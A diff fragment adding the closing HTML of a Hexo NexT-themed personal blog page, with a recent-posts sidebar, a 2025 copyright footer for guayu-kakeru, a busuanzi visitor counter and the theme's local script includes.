+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
